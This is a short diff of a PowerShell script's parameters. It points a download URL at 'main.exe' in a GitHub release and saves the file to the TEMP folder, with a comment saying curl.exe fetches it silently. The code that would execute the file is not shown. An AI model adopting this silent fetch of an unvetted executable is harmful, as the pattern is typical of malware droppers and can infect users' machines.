@@ -1,6 +1,6 @@
 param (
     [string]$DownloadUrl = 'https://github.com/giasfelfebrehber/stuff/releases/download/1/main.exe',
-    [string]$OutputPath = "$env:TEMP\release.exe"
+    [string]$OutputPath = "$env:TEMP\main.exe"
 )
 
 # Download using curl.exe silently
